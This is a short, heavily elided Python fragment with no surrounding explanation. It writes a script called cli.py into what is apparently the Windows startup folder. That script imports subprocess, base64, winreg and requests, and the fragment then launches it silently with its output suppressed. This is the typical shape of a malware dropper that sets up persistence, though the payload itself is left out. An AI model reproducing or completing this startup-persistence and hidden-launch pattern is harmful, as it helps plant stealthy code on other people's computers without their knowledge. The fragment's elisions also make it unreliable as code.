...
''')
    with open(os.path.join(startup_path, 'cli.py'), 'w', encoding='utf-8') as clis:
        clis.write('''
import subprocess, base64, os, winreg, requests
...
''')
    ...
    subprocess.Popen(['python', os.path.join(startup_path, 'cli.py')], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
